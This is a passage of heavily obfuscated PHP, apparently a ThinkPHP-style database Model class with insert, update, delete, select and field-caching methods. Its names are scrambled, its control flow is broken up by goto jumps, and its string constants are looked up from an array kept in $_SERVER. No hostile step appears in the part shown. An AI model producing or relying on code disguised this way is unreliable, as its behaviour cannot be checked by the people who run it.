$D–¦øĞ—ƒ¼[$aè™©’—°Ù[1428]] << 25 | $D–¦øĞ—ƒ¼[$aè™©’—°Ù[1429]] << 21 | $D–¦øĞ—ƒ¼[$aè™©’—°Ù[1430]] << 16 | $D–¦øĞ—ƒ¼[$aè™©’—°Ù[1431]] << 11 | $D–¦øĞ—ƒ¼[$aè™©’—°Ù[1432]] << 5 | $D–¦øĞ—ƒ¼[$aè™©’—°Ù[1433]] >> 1; } protected function packFields($E¦˜¬İµÏ) { $béô¸Û˜ø  =& $_SERVER[İåâé¾]; $D½ãª•Å˜ = $béô¸Û˜ø [33]; $bÊ¡³ªŸò¦ = array(); foreach ($E¦˜¬İµÏ as $EÃŸ²¢‘“à) { $D½ãª•Å˜ .= $EÃŸ²¢‘“à[0]; $bÊ¡³ªŸò¦[] = $EÃŸ²¢‘“à[1]; } array_unshift($bÊ¡³ªŸò¦, $D½ãª•Å˜); return call_user_func_array($béô¸Û˜ø [1434], $bÊ¡³ªŸò¦); } protected function filterFilename($AæÆ††Êá°) { $f¶’Êìã† =& $_SERVER[İåâé¾]; return str_replace(array($f¶’Êìã†[92], $f¶’Êìã†[4], $f¶’Êìã†[172], $f¶’Êìã†[70], $f¶’Êìã†[111], $f¶’Êìã†[691], $f¶’Êìã†[694], $f¶’Êìã†[274]), $f¶’Êìã†[71], $AæÆ††Êá°); } } goto b¿•Æ’’˜; E³³âÍÂ˜: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\x65", "\x6f\162\144\x65\x72", "\141\154\x69\141\163", "\x68\x61\166\151\156\147", "\147\x72\157\165\160", "\154\157\143\153", "\x64\x69\163\164\151\156\143\x74", "\x61\x75\164\x6f", "\x66\151\x6c\x74\x65\x72", "\x76\x61\154\x69\x64\141\164\x65", "\162\145\163\165\x6c\x74", "\x62\151\x6e\144", "\x74\157\153\x65\x6e"); public function __construct($aå¨–çÄ = '', $bæ×ƒÌÇ¬ = '', $eí¥Ãêë²® = '') { $fçÉº«»ê© =& $_SERVER[İåâé¾]; $this->_initialize(); if (!empty($aå¨–çÄ)) { if (strpos($aå¨–çÄ, $fçÉº«»ê©[90])) { list($this->dbName, $this->name) = explode($fçÉº«»ê©[90], $aå¨–çÄ); } else { $this->name = $aå¨–çÄ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($bæ×ƒÌÇ¬)) { $this->tablePrefix = $fçÉº«»ê©[33]; } elseif ($fçÉº«»ê©[33] != $bæ×ƒÌÇ¬) { $this->tablePrefix = $bæ×ƒÌÇ¬; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($fçÉº«»ê©[235]); } $this->db(0, empty($this->connection) ? $eí¥Ãêë²® : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $B¹ãñÁğ =& $_SERVER[İåâé¾]; if (empty($this->fields)) { if (think_config($B¹ãñÁğ[236])) { $CÁ”Úô¢œ = $this->dbName ? $this->dbName : think_config($B¹ãñÁğ[237]); $dìªáÈ¶ˆİ = think_var_cache($B¹ãñÁğ[238] . strtolower(get_path_this($CÁ”Úô¢œ) . $B¹ãñÁğ[90] . $this->name)); if ($dìªáÈ¶ˆİ) { $d…Ä…™ì£¥ = think_config($B¹ãñÁğ[239]); if (empty($d…Ä…™ì£¥) || $dìªáÈ¶ˆİ[$B¹ãñÁğ[240]] == $d…Ä…™ì£¥) { $this->fields = $dìªáÈ¶ˆİ; return; } } } $this->flush(); } } public function flush() { goto bã¢Á‹‹Ë†; AÖÖ™Ù’×Ù: foreach ($då²ÅØÆÁè as $EÀñ‘£Ã®ù => $b’ÓÑÇÃ‚‘) { $BÚŠ—ÂŠŸ±[$EÀñ‘£Ã®ù] = $b’ÓÑÇÃ‚‘[$D†ÅŞ‡È±„[29]]; if ($b’ÓÑÇÃ‚‘[$D†ÅŞ‡È±„[36]]) { $this->fields[$D†ÅŞ‡È±„[242]] = $EÀñ‘£Ã®ù; if ($b’ÓÑÇÃ‚‘[$D†ÅŞ‡È±„[39]]) { $this->fields[$D†ÅŞ‡È±„[241]] = !0; } } } $this->fields[$D†ÅŞ‡È±„[243]] = $BÚŠ—ÂŠŸ±; if (think_config($D†ÅŞ‡È±„[239])) { $this->fields[$D†ÅŞ‡È±„[240]] = think_config($D†ÅŞ‡È±„[239]); } goto B…¯ÎÄùŒ; bã¢Á‹‹Ë†: $D†ÅŞ‡È±„ =& $_SERVER[İåâé¾]; $this->db->setModel($this->name); $då²ÅØÆÁè = $this->db->getFields($this->getTableName()); goto bå˜¤¸ïí¦; B…¯ÎÄùŒ: if (think_config($D†ÅŞ‡È±„[236])) { $E¶˜’µÒîÅ = $this->dbName ? $this->dbName : think_config($D†ÅŞ‡È±„[237]); think_var_cache($D†ÅŞ‡È±„[238] . strtolower(get_path_this($E¶˜’µÒîÅ) . $D†ÅŞ‡È±„[90] . $this->name), $this->fields); } goto DÛ«¨›ÌÙ; bå˜¤¸ïí¦: if (!$då²ÅØÆÁè) { return !1; } $this->fields = array_keys($då²ÅØÆÁè); $this->fields[$D†ÅŞ‡È±„[241]] = !1; goto AÖÖ™Ù’×Ù; DÛ«¨›ÌÙ: } public function switchModel($cêµÍ¡Šß«, $E–ßŠ±ƒ ø = array()) { $FòÙÎÉ¶…‘ =& $_SERVER[İåâé¾]; $b—÷„‹ßÄì = ucwords(strtolower($cêµÍ¡Šß«)) . $FòÙÎÉ¶…‘[244]; if (!class_exists($b—÷„‹ßÄì)) { think_exception($b—÷„‹ßÄì . think_lang($FòÙÎÉ¶…‘[245])); } $this->_extModel = new $b—÷„‹ßÄì($this->name); if (!empty($E–ßŠ±ƒ ø)) { foreach ($E–ßŠ±ƒ ø as $c‰®ô‡‘¾–) { $this->_extModel->setProperty($c‰®ô‡‘¾–, $this->{$c‰®ô‡‘¾–}); } } return $this->_extModel; } public function __set($dåøÛæ˜®, $c×Ì³ µ¼) { $this->data[$dåøÛæ˜®] = $c×Ì³ µ¼; } public function __get($F´×ÔòÓ¤ˆ) { return isset($this->data[$F´×ÔòÓ¤ˆ]) ? $this->data[$F´×ÔòÓ¤ˆ] : null; } public function __isset($dÔ„ØËëË) { return isset($this->data[$dÔ„ØËëË]); } public function __unset($CÊ·¥Õ‘) { unset($this->data[$CÊ·¥Õ‘]); } public function __call($Fíµ­å ‘Œ, $Dë„ØºÛ”) { $FÄìëˆ…„ =& $_SERVER[İåâé¾]; if (in_array(strtolower($Fíµ­å ‘Œ), $this->methods, !0)) { $this->options[strtolower($Fíµ­å ‘Œ)] = $Dë„ØºÛ”[0]; return $this; } elseif (in_array(strtolower($Fíµ­å ‘Œ), array($FÄìëˆ…„[246], $FÄìëˆ…„[247], $FÄìëˆ…„[248], $FÄìëˆ…„[249], $FÄìëˆ…„[250]), !0)) { $aåŠ¡ëƒé° = isset($Dë„ØºÛ”[0]) ? $Dë„ØºÛ”[0] : $FÄìëˆ…„[172]; $aåŠ¡ëƒé° = $this->db->parseKey($aåŠ¡ëƒé°); return $this->getField(strtoupper($Fíµ­å ‘Œ) . $FÄìëˆ…„[251] . $aåŠ¡ëƒé° . $FÄìëˆ…„[252] . $Fíµ­å ‘Œ, $FÄìëˆ…„[246]); } elseif (strtolower(substr($Fíµ­å ‘Œ, 0, 5)) == $FÄìëˆ…„[253]) { $aåŠ¡ëƒé° = think_parse_name(substr($Fíµ­å ‘Œ, 5)); $bÍâì›“[$aåŠ¡ëƒé°] = $Dë„ØºÛ”[0]; return $this->where($bÍâì›“)->find(); } elseif (strtolower(substr($Fíµ­å ‘Œ, 0, 10)) == $FÄìëˆ…„[254]) { $c¦æ·á¤ÃÏ = think_parse_name(substr($Fíµ­å ‘Œ, 10)); $bÍâì›“[$c¦æ·á¤ÃÏ] = $Dë„ØºÛ”[0]; return $this->where($bÍâì›“)->getField($Dë„ØºÛ”[1]); } elseif (isset($this->_scope[$Fíµ­å ‘Œ])) { return $this->scope($Fíµ­å ‘Œ, $Dë„ØºÛ”[0]); } elseif (method_exists($this, $Fíµ­å ‘Œ)) { array_unshift($Dë„ØºÛ”, $Fíµ­å ‘Œ); return call_user_func_array(array($this, $FÄìëˆ…„[255]), $Dë„ØºÛ”); } else { return call_user_func_array(array(parent, $Fíµ­å ‘Œ), $Dë„ØºÛ”); } } protected function call() { goto CÕ…ñÎ½Öê; E¿’®™ÃÌ: $eÆñ…ĞÒÜÕ = $bô¬‡Íã‘ó; if (is_array($bô¬‡Íã‘ó)) { $eÆñ…ĞÒÜÕ = $bô¬‡Íã‘ó[1]; $bô¬‡Íã‘ó = $bô¬‡Íã‘ó[0]; } if ($E¶ÃßİÁ[count($E¶ÃßİÁ) - 1] === $bô¬‡Íã‘ó) { think_exception(__CLASS__ . $BÏ÷Å¦’°µ[4] . $bô¬‡Íã‘ó . think_lang($BÏ÷Å¦’°µ[256])); return; } goto D¨šÍ¬¦; D¨šÍ¬¦: $E¶ÃßİÁ[] = $bô¬‡Íã‘ó; if (method_exists($this, $BÏ÷Å¦’°µ[257])) { $b‰ßãŒ‘¤æ = call_user_func_array(array($this, $BÏ÷Å¦’°µ[258]), array($eÆñ…ĞÒÜÕ, $E¶ÃßİÁ)); if (!is_null($b‰ßãŒ‘¤æ) && $b‰ßãŒ‘¤æ !== !1) { return $b‰ßãŒ‘¤æ; } } $A²šœÃ¥¥ = call_user_func_array(array($this, $bô¬‡Íã‘ó), $E¶ÃßİÁ); goto BÄô•Æ°‡º; CÕ…ñÎ½Öê: $BÏ÷Å¦’°µ =& $_SERVER[İåâé¾]; $E¶ÃßİÁ = func_get_args(); $bô¬‡Íã‘ó = array_shift($E¶ÃßİÁ); goto E¿’®™ÃÌ; BÄô•Æ°‡º: if (method_exists($this, $BÏ÷Å¦’°µ[259])) { $b‰ßãŒ‘¤æ = call_user_func_array(array($this, $BÏ÷Å¦’°µ[260]), array($eÆñ…ĞÒÜÕ, $E¶ÃßİÁ, $A²šœÃ¥¥)); if ($b‰ßãŒ‘¤æ) { return $b‰ßãŒ‘¤æ; } } return $A²šœÃ¥¥; goto cˆ«‚š¬Ø; cˆ«‚š¬Ø: } protected function _initialize() { } protected function _facade($Côô’ƒó…) { $bƒ“´á–ãÆ =& $_SERVER[İåâé¾]; if (!empty($this->fields)) { foreach ($Côô’ƒó… as $DãÊØëßè´ => $eÓùÁÂÓº) { if (!in_array($DãÊØëßè´, $this->fields, !0)) { unset($Côô’ƒó…[$DãÊØëßè´]); } elseif (is_scalar($eÓùÁÂÓº)) { $this->_parseType($Côô’ƒó…, $DãÊØëßè´); } } } if (!empty($this->options[$bƒ“´á–ãÆ[261]])) { $Côô’ƒó… = array_map($this->options[$bƒ“´á–ãÆ[261]], $Côô’ƒó…); unset($this->options[$bƒ“´á–ãÆ[261]]); } $this->_beforeWrite($Côô’ƒó…); return $Côô’ƒó…; } protected function _beforeWrite(&$cå»õŒìÓ³) { } public function add($bœÖ‹óÀ’÷ = '', $F²æéŸÔ•Ó = array(), $F«ëÂè‰ø = false) { goto Cšˆ¶š†‘; Cšˆ¶š†‘: if (empty($bœÖ‹óÀ’÷)) { if (!empty($this->data)) { $bœÖ‹óÀ’÷ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[İåâé¾][262]); return !1; } } $F²æéŸÔ•Ó = $this->_parseOptions($F²æéŸÔ•Ó); $bœÖ‹óÀ’÷ = $this->_facade($bœÖ‹óÀ’÷); goto BÌÎÜÙÛåÔ; EôˆÅ¹°¬: return $dÔ¡å¼–; goto bÑÉ¸¬›çÏ; BÌÎÜÙÛåÔ: if (!1 === $this->_beforeInsert($bœÖ‹óÀ’÷, $F²æéŸÔ•Ó)) { return !1; } $dÔ¡å¼– = $this->db->insert($bœÖ‹óÀ’÷, $F²æéŸÔ•Ó, $F«ëÂè‰ø); if (!1 !== $dÔ¡å¼–) { $E¿Ï‡òåƒÍ = $this->getLastInsID(); if ($E¿Ï‡òåƒÍ) { $bœÖ‹óÀ’÷[$this->getPk()] = $E¿Ï‡òåƒÍ; $this->_after_insert($bœÖ‹óÀ’÷, $F²æéŸÔ•Ó); return $E¿Ï‡òåƒÍ; } $this->_after_insert($bœÖ‹óÀ’÷, $F²æéŸÔ•Ó); } goto EôˆÅ¹°¬; bÑÉ¸¬›çÏ: } protected function _beforeInsert(&$BŒó·ïã¨, $f½–ğïƒ©) { } protected function _after_insert($c‡’È…—Ï, $D—‰ˆÇ•ó¦) { } public function addAll($aĞ¤•øÏ, $fÇ±À¦éº® = array(), $cï„Ùïœ¨£ = false) { goto eäÜ¼ÏàŞ‘; eäÜ¼ÏàŞ‘: $Bˆ¶Ç»Ìâ =& $_SERVER[İåâé¾]; if (empty($aĞ¤•øÏ)) { $this->error = think_lang($Bˆ¶Ç»Ìâ[262]); return !1; } $fÇ±À¦éº® = $this->_parseOptions($fÇ±À¦éº®); goto dê‡‡¸Ã•­; dê‡‡¸Ã•­: foreach ($aĞ¤•øÏ as $aÆ¢çÊ³šã => $a™–ğÒÇÔ÷) { $aĞ¤•øÏ[$aÆ¢çÊ³šã] = $this->_facade($a™–ğÒÇÔ÷); } if (method_exists($this->db, $Bˆ¶Ç»Ìâ[263])) { $AÂ–ù¾š„ = $this->db->insertAll($aĞ¤•øÏ, $fÇ±À¦éº®, $cï„Ùïœ¨£); } else { $this->startTrans(); foreach ($aĞ¤•øÏ as $aÆ¢çÊ³šã => $a™–ğÒÇÔ÷) { $AÂ–ù¾š„ = $this->db->insert($a™–ğÒÇÔ÷, $fÇ±À¦éº®, $cï„Ùïœ¨£); } $this->commit(); } if (!1 !== $AÂ–ù¾š„) { $Bè˜ãĞç™Ğ = $this->getLastInsID(); if ($Bè˜ãĞç™Ğ) { return $Bè˜ãĞç™Ğ; } } goto f¡©¥‘×™; f¡©¥‘×™: return $AÂ–ù¾š„; goto C§ÕŞ‰±ïŞ; C§ÕŞ‰±ïŞ: } public function selectAdd($d¨ë¬ëßˆ§ = '', $béˆ¸¡ä²Â = '', $d’ï©ÀŸĞè = array()) { $b©¿¾ôâÜÜ =& $_SERVER[İåâé¾]; $d’ï©ÀŸĞè = $this->_parseOptions($d’ï©ÀŸĞè); if (!1 === ($Cï¯ì™† = $this->db->selectInsert($d¨ë¬ëßˆ§ ? $d¨ë¬ëßˆ§ : $d’ï©ÀŸĞè[$b©¿¾ôâÜÜ[264]], $béˆ¸¡ä²Â ? $béˆ¸¡ä²Â : $this->getTableName(), $d’ï©ÀŸĞè))) { $this->error = think_lang($b©¿¾ôâÜÜ[265]); return !1; } else { return $Cï¯ì™†; } } public function save($bÜˆšÍ¼™ = '', $fë‰¾Éñ‚ = array()) { goto bó¥‹óõº; aöõÛˆ©Øù: if (is_array($fë‰¾Éñ‚[$aøÚáÁ¦Å[266]]) && isset($fë‰¾Éñ‚[$aøÚáÁ¦Å[266]][$BìÜ¦’óå¬])) { $Dˆ†÷¼¥¢¯ = $fë‰¾Éñ‚[$aøÚáÁ¦Å[266]][$BìÜ¦’óå¬]; } if (!1 === $this->_beforeUpdate($bÜˆšÍ¼™, $fë‰¾Éñ‚)) { return !1; } $Eê÷¸¡–ì¦ = $this->db->update($bÜˆšÍ¼™, $fë‰¾Éñ‚); goto dæ¶Â‹©­; bó¥‹óõº: $aøÚáÁ¦Å =& $_SERVER[İåâé¾]; if (empty($bÜˆšÍ¼™)) { if (!empty($this->data)) { $bÜˆšÍ¼™ = $this->data; $this->data = array(); } else { $this->error = think_lang($aøÚáÁ¦Å[262]); return !1; } } $bÜˆšÍ¼™ = $this->_facade($bÜˆšÍ¼™); goto D¹ìïÎÂ³³; D¹ìïÎÂ³³: $fë‰¾Éñ‚ = $this->_parseOptions($fë‰¾Éñ‚); $BìÜ¦’óå¬ = $this->getPk(); if (!isset($fë‰¾Éñ‚[$aøÚáÁ¦Å[266]])) { if (isset($bÜˆšÍ¼™[$BìÜ¦’óå¬])) { $cä¶Şˆùï¾[$BìÜ¦’óå¬] = $bÜˆšÍ¼™[$BìÜ¦’óå¬]; $fë‰¾Éñ‚[$aøÚáÁ¦Å[266]] = $cä¶Şˆùï¾; unset($bÜˆšÍ¼™[$BìÜ¦’óå¬]); } else { $this->error = think_lang($aøÚáÁ¦Å[265]); return !1; } } goto aöõÛˆ©Øù; dæ¶Â‹©­: if (!1 !== $Eê÷¸¡–ì¦) { if (isset($Dˆ†÷¼¥¢¯)) { $bÜˆšÍ¼™[$BìÜ¦’óå¬] = $Dˆ†÷¼¥¢¯; } $this->_afterUpdate($bÜˆšÍ¼™, $fë‰¾Éñ‚); } return $Eê÷¸¡–ì¦; goto bÁÉÏâÏ³±; bÁÉÏâÏ³±: } protected function _beforeUpdate(&$B…‡¡¬´¿©, $C÷ÈìØì•²) { } protected function _afterUpdate($D« ¾‹¨íæ, $CÓ¹õ¯Ôå) { } public function delete($Dá…êˆâÄ = array()) { goto FˆŠŠ¤Ç˜; FˆŠŠ¤Ç˜: $C“÷ÙÍº—² =& $_SERVER[İåâé¾]; if (empty($Dá…êˆâÄ) && empty($this->options[$C“÷ÙÍº—²[266]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $D–»ÊÁ¿ã = $this->getPk(); goto dÜã¢„˜…›; dÍ­—ñ— Ê: $aêá™ÓÃÈà = $this->db->delete($Dá…êˆâÄ); if (!1 !== $aêá™ÓÃÈà) { $BÃˆÓòØö» = array(); if (isset($Eİ‡»¤‡²¦)) { $BÃˆÓòØö»[$D–»ÊÁ¿ã] = $Eİ‡»¤‡²¦; } $this->_after_delete($BÃˆÓòØö», $Dá…êˆâÄ); } return $aêá™ÓÃÈà; goto E÷Ñ¶¥»À‘; dÜã¢„˜…›: if (is_numeric($Dá…êˆâÄ) || is_string($Dá…êˆâÄ)) { if (strpos($Dá…êˆâÄ, $C“÷ÙÍº—²[47])) { $B”…ÀÊ‰Æ‡[$D–»ÊÁ¿ã] = array($C“÷ÙÍº—²[267], $Dá…êˆâÄ); } else { $B”…ÀÊ‰Æ‡[$D–»ÊÁ¿ã] = $Dá…êˆâÄ; } $this->options[$C“÷ÙÍº—²[266]] = $B”…ÀÊ‰Æ‡; } $Dá…êˆâÄ = $this->_parseOptions(); if (is_array($Dá…êˆâÄ[$C“÷ÙÍº—²[266]]) && isset($Dá…êˆâÄ[$C“÷ÙÍº—²[266]][$D–»ÊÁ¿ã])) { $Eİ‡»¤‡²¦ = $Dá…êˆâÄ[$C“÷ÙÍº—²[266]][$D–»ÊÁ¿ã]; } goto dÍ­—ñ— Ê; E÷Ñ¶¥»À‘: } protected function _after_delete($eÎ‘Œ»Ş, $a‡»¤ê´Æœ) { } public function select($bŠåİé–Éğ = array()) { goto aÎ…âäµ‡Ş; aÎ…âäµ‡Ş: $f»íÂì”¬Õ =& $_SERVER[İåâé¾]; if (is_string($bŠåİé–Éğ) || is_numeric($bŠåİé–Éğ)) { $BÒ–Ì¶ƒÚö = $this->getPk(); if (strpos($bŠåİé–Éğ, $f»íÂì”¬Õ[47])) { $eÛ•œŞæÇÇ[$BÒ–Ì¶ƒÚö] = array($f»íÂì”¬Õ[267], $bŠåİé–Éğ); } else { $eÛ•œŞæÇÇ[$BÒ–Ì¶ƒÚö] = $bŠåİé–Éğ; } $this->options[$f»íÂì”¬Õ[266]] = $eÛ•œŞæÇÇ; } elseif (!1 === $bŠåİé–Éğ) { $bŠåİé–Éğ = $this->_parseOptions(); return $f»íÂì”¬Õ[268] . $this->db->buildSelectSql($bŠåİé–Éğ) . $f»íÂì”¬Õ[269]; } $bŠåİé–Éğ = $this->_parseOptions(); goto E‰âï„—¢ä; AÈ®Ù¥ À³: $this->_afterSelect($C¾ùØíˆÒ, $bŠåİé–Éğ); return $C¾ùØíˆÒ; goto b‘¨æ‰‘á§; E‰âï„—¢ä: $C¾ùØíˆÒ = $this->db->select($bŠåİé–Éğ); if (!1 === $C¾ùØíˆÒ) { return !1; } if (empty($C¾ùØíˆÒ)) { return null; } goto AÈ®Ù¥ À³; b‘¨æ‰‘á§: } protected function _afterSelect(&$d•ÙÒ™©ß, $fÒ—°÷Õ‰ˆ) { } public function buildSql($E»óçµ›àô = array()) { $d‡‰êÊ™‰œ =& $_SERVER[İåâé¾]; $E»óçµ›àô = $this->_parseOptions($E»óçµ›àô); return $d‡‰êÊ™‰œ[268] . $this->db->buildSelectSql($E»óçµ›àô) . $d‡‰êÊ™‰œ[269]; } public function optionsValue($dì‹³†Ûç = null) { if (is_null($dì‹³†Ûç)) { return $this->options; } elseif (is_array($dì‹³†Ûç)) { $this->options = array_merge($this->options, $dì‹³†Ûç); } } protected function _parseOptions($D„Æ®èè½ = array()) { goto f¥ƒê´Ïß»; f¥ƒê´Ïß»: $f‰£ÀÆŸŒ =& $_SERVER[İåâé¾]; if (is_array($D„Æ®èè½)) { $D„Æ®èè½ = array_merge($this->options, $D„Æ®èè½); } $this->options = array(); goto b •ĞÍ¾š¤; F¶¢ÇÕÁ®í: if (isset($D„Æ®èè½[$f‰£ÀÆŸŒ[266]]) && is_array($D„Æ®èè½[$f‰£ÀÆŸŒ[266]]) && !empty($C›Òùè‹”Å) && !isset($D„Æ®èè½[$f‰£ÀÆŸŒ[273]]) && !isset($D„Æ®èè½[$f‰£ÀÆŸŒ[270]])) { foreach ($D„Æ®èè½[$f‰£ÀÆŸŒ[266]] as $E¶Ÿ§Ú×·Ê => $bÍÒÀ¯¹) { $E¶Ÿ§Ú×·Ê = trim($E¶Ÿ§Ú×·Ê); if (in_array($E¶Ÿ§Ú×·Ê, $C›Òùè‹”Å, !0)) { if (is_scalar($bÍÒÀ¯¹)) { $this->_parseType($D„Æ®èè½[$f‰£ÀÆŸŒ[266]], $E¶Ÿ§Ú×·Ê); } } elseif (!is_numeric($E¶Ÿ§Ú×·Ê) && $f‰£ÀÆŸŒ[71] != substr($E¶Ÿ§Ú×·Ê, 0, 1) && !1 === strpos($E¶Ÿ§Ú×·Ê, $f‰£ÀÆŸŒ[90]) && !1 === strpos($E¶Ÿ§Ú×·Ê, $f‰£ÀÆŸŒ[251]) && !1 === strpos($E¶Ÿ§Ú×·Ê, $f‰£ÀÆŸŒ[274]) && !1 === strpos($E¶Ÿ§Ú×·Ê, $f‰£ÀÆŸŒ[275])) { unset($D„Æ®èè½[$f‰£ÀÆŸŒ[266]][$E¶Ÿ§Ú×·Ê]); } } } $this->_options_filter($D„Æ®èè½); return $D„Æ®èè½; goto aË™­Õé’Û; b •ĞÍ¾š¤: if (!isset($D„Æ®èè½[$f‰£ÀÆŸŒ[270]])) { $D„Æ®èè½[$f‰£ÀÆŸŒ[270]] = $this->getTableName(); $C›Òùè‹”Å = $this->fields; } else { $C›Òùè‹”Å = $this->getDbFields(); } if (!empty($D„Æ®èè½[$f‰£ÀÆŸŒ[271]])) { $D„Æ®èè½[$f‰£ÀÆŸŒ[270]] .= $f‰£ÀÆŸŒ[50] . $D„Æ®èè½[$f‰£ÀÆŸŒ[271]]; } $D„Æ®èè½[$f‰£ÀÆŸŒ[272]] = $this->name; goto F¶¢ÇÕÁ®í; aË™­Õé’Û: } protected function _options_filter(&$d¾ƒÔ†’¸“) { } protected function _parseType(&$F³¥ÚºËàˆ, $c­Ú®ŒÖö) { $d¤º‡à–½ƒ =& $_SERVER[İåâé¾]; if (empty($this->options[$d¤º‡à–½ƒ[276]][$d¤º‡à–½ƒ[4] . $c­Ú®ŒÖö])) { $Eª·¦¼ÅŸØ = strtolower($this->fields[$d¤º‡à–½ƒ[243]][$c­Ú®ŒÖö]); if (!1 !== strpos($Eª·¦¼ÅŸØ, $d¤º‡à–½ƒ[277])) { } elseif (!1 === strpos($Eª·¦¼ÅŸØ, $d¤º‡à–½ƒ[278]) && !1 !== strpos($Eª·¦¼ÅŸØ, $d¤º‡à–½ƒ[279])) { $F³¥ÚºËàˆ[$c­Ú®ŒÖö] = intval($F³¥ÚºËàˆ[$c­Ú®ŒÖö]); } elseif (!1 !== strpos($Eª·¦¼ÅŸØ, $d¤º‡à–½ƒ[280]) || !1 !== strpos($Eª·¦¼ÅŸØ, $d¤º‡à–½ƒ[281])) { $F³¥ÚºËàˆ[$c­Ú®ŒÖö] = floatval($F³¥ÚºËàˆ[$c­Ú®ŒÖö]); } elseif (!1 !== strpos($Eª·¦¼ÅŸØ, $d¤º‡à–½ƒ[282])) { $F³¥ÚºËàˆ[$c­Ú®ŒÖö] = (bool) $F³¥ÚºËàˆ[$c­Ú®ŒÖö]; } } } public function find($f­³£¬ö = array()) { goto fª÷Ì ¦˜æ; CôÜòÆíù: if (empty($E‡áÇ»¹©)) { return null; } $this->data = $E‡áÇ»¹©[0]; $this->_afterFind($this->data, $f­³£¬ö); goto fÃë½×ˆƒ; f…Ì£±çº: $f­³£¬ö = $this->_parseOptions(); $E‡áÇ»¹© = $this->db->select($f­³£¬ö); if (!1 === $E‡áÇ»¹©) { return !1; } goto CôÜòÆíù; fÃë½×ˆƒ: if (!empty($this->options[$bôçÉ¼ß¬ô[284]])) { return $this->returnResult($this->data, $this->options[$bôçÉ¼ß¬ô[284]]); } return $this->data; goto dÎœ¸Õ‡ŞŸ; fª÷Ì ¦˜æ: $bôçÉ¼ß¬ô =& $_SERVER[İåâé¾]; if (is_numeric($f­³£¬ö) || is_string($f­³£¬ö)) { $Aí´‡°âÔ‘[$this->getPk()] = $f­³£¬ö; $this->options[$bôçÉ¼ß¬ô[266]] = $Aí´‡°âÔ‘; } $this->options[$bôçÉ¼ß¬ô[283]] = 1; goto f…Ì£±çº; dÎœ¸Õ‡ŞŸ: } protected function _afterFind(&$FãŒˆèñ Œ, $c‡Û“…®™Š) { } protected function returnResult($B×øÆù¨œ», $aÚÊÔôß¬å = '') { $eÜç–ÕÇÑë =& $_SERVER[İåâé¾]; if ($aÚÊÔôß¬å) { if (is_callable($aÚÊÔôß¬å)) { return call_user_func($aÚÊÔôß¬å, $B×øÆù¨œ»); } switch (strtolower($aÚÊÔôß¬å)) { case $eÜç–ÕÇÑë[285]: return json_encode($B×øÆù¨œ»); case $eÜç–ÕÇÑë[286]: return xml_encode($B×øÆù¨œ»); } } return $B×øÆù¨œ»; } public function parseFieldsMap($Bçõò÷ªÒ, $aøà¾õÀãõ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $cÆ©šŠ§»Ä => $aùØÇŒ¯Ï—) { if ($aøà¾õÀãõ == 1) { if (isset($Bçõò÷ªÒ[$aùØÇŒ¯Ï—])) { $Bçõò÷ªÒ[$cÆ©šŠ§»Ä] = $Bçõò÷ªÒ[$aùØÇŒ¯Ï—]; unset($Bçõò÷ªÒ[$aùØÇŒ¯Ï—]); } } else { if (isset($Bçõò÷ªÒ[$cÆ©šŠ§»Ä])) { $Bçõò÷ªÒ[$aùØÇŒ¯Ï—] = $Bçõò÷ªÒ[$cÆ©šŠ§»Ä]; unset($Bçõò÷ªÒ[$cÆ©šŠ§»Ä]); } } } } return $Bçõò÷ªÒ; } public function setField($eíßö‚„§Ö, $c‰ùƒ¡à±§ = '') { if (is_array($eíßö‚„§Ö)) { $E…äŒ¸ÆÖ = $eíßö‚„§Ö; } else { $E…äŒ¸ÆÖ[$eíßö‚„§Ö] = $c‰ùƒ¡à±§; } return $this->save($E…äŒ¸ÆÖ); } public function setAdd($D‹ŒÁ‚³ëÈ, $e¢³¬ÙÊ´ = 1) { $e·Çã£¢¿‚ =& $_SERVER[İåâé¾]; $a‘ª×›µØ‚ = $D‹ŒÁ‚³ëÈ . $e·Çã£¢¿‚[287] . $e¢³¬ÙÊ´; if ($e¢³¬ÙÊ´ < 0) { $a‘ª×›µØ‚ = $D‹ŒÁ‚³ëÈ . $e¢³¬ÙÊ´; } return $this->setField($D‹ŒÁ‚³ëÈ, array($e·Çã£¢¿‚[288], $a‘ª×›µØ‚)); } public function getField($EİÑÖâÑÀ, $EÕ‹Í¨Úì = null) { $Fà ªÑæÄ =& $_SERVER[İåâé¾]; $fƒ½àİ±ëƒ[$Fà ªÑæÄ[264]] = $EİÑÖâÑÀ; $fƒ½àİ±ëƒ = $this->_parseOptions($fƒ½àİ±ëƒ); $EİÑÖâÑÀ = trim($EİÑÖâÑÀ); if (strpos($EİÑÖâÑÀ, $Fà ªÑæÄ[47])) { if (!isset($fƒ½àİ±ëƒ[$Fà ªÑæÄ[283]])) { $fƒ½àİ±ëƒ[$Fà ªÑæÄ[283]] = is_numeric($EÕ‹Í¨Úì) ? $EÕ‹Í¨Úì : $Fà ªÑæÄ[33]; } $Bù¯ÔíÀÉƒ = $this->db->select($fƒ½àİ±ëƒ); if (!empty($Bù¯ÔíÀÉƒ)) { goto c¥²´Ş±’§; añŠá„…ã†: foreach ($Bù¯ÔíÀÉƒ as $CŸ­àÇñì‹) { $Eâõ¿÷ÌòË = $CŸ­àÇñì‹[$a…ŠÑ›Ïã•]; if (2 == $aá®æ‚‰³) { $däßçÈÒ¡ˆ[$Eâõ¿÷ÌòË] = $CŸ­àÇñì‹[$Dï›£Œïğ¤]; } else { $däßçÈÒ¡ˆ[$Eâõ¿÷ÌòË] = is_string($EÕ‹Í¨Úì) ? implode($EÕ‹Í¨Úì, $CŸ­àÇñì‹) : $CŸ­àÇñì‹; } } return $däßçÈÒ¡ˆ; goto C”Œ£–§øƒ; c¥²´Ş±’§: $AÊ‰ùµ¥ˆÊ = explode($Fà ªÑæÄ[47], $EİÑÖâÑÀ); $EİÑÖâÑÀ = 